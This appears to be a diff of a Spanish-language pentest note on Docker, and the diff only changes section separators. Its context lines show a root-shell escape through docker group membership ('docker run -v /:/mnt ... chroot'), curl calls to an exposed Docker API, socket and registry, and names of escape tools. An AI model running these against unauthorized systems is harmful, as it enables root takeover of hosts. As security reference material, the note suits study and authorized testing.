@@ -12,7 +12,7 @@ kind: Tool
 > [!info]
 > Container runtime. En pentest: docker socket exposed = root host equivalente, escape de container, registry expuesto, secrets en imágenes.
 
-***
+---
 
 ## Recon
 
@@ -25,7 +25,7 @@ curl http://<target>:2375/containers/json
 id | grep docker
 ```
 
-***
+---
 
 ## Membresía docker group → root
 
@@ -36,7 +36,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 # Ahora tenés shell como root en el host
 ```
 
-***
+---
 
 ## Docker socket exposed (CVE / misconfig)
 
@@ -51,7 +51,7 @@ curl -X POST --unix-socket /var/run/docker.sock \
   http://docker/containers/create
 ```
 
-***
+---
 
 ## Escape patterns
 
@@ -63,7 +63,7 @@ curl -X POST --unix-socket /var/run/docker.sock \
 
 Ver tools: `deepce`, `cdk`, manual GTFOBins.
 
-***
+---
 
 ## Registry expuesto
 
@@ -78,7 +78,7 @@ curl http://<target>:5000/v2/<repo>/tags/list
 curl http://<target>:5000/v2/<repo>/manifests/<tag>
 ```
 
-***
+---
 
 ## Notas Relacionadas
 
